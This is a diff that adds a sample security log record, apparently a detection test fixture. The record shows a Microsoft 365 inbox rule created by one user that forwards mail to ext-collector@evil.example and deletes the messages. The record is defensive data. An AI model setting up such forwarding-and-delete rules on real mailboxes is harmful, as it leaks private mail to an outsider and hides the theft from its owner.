@@ -1,0 +1,22 @@
+{
+  "class_uid": 6003,
+  "class_name": "API Activity",
+  "category_name": "Identity & Access Management",
+  "activity_name": "New-InboxRule",
+  "time": "2026-08-15T05:41:19Z",
+  "severity": "High",
+  "status": "Success",
+  "message": "New-InboxRule by eve@vetra.se on Exchange",
+  "metadata": {
+    "product": { "name": "Microsoft 365", "vendor_name": "Microsoft" },
+    "version": "1.3.0"
+  },
+  "actor": { "user": { "name": "eve@vetra.se", "uid": "10032001A5C1D2E3" } },
+  "src_endpoint": { "ip": "198.51.100.23" },
+  "device": { "hostname": "Exchange" },
+  "unmapped": {
+    "record_type": "1",
+    "organization_id": "d1f6a5b2-1111-2222-3333-444455556666",
+    "Parameters": "ForwardTo: ext-collector@evil.example; DeleteMessage: True"
+  }
+}
